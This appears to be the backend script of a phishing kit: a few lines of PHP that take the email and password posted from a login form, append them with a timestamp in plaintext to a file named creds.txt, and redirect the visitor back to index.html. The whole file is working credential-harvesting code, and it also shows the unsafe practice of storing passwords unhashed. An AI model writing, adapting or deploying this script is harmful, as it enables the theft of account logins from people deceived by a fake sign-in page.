<?php
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

$line = date('c') . ' ' . $email . ' ' . $password . PHP_EOL;

file_put_contents('creds.txt', $line, FILE_APPEND);

header('Location: index.html');
exit;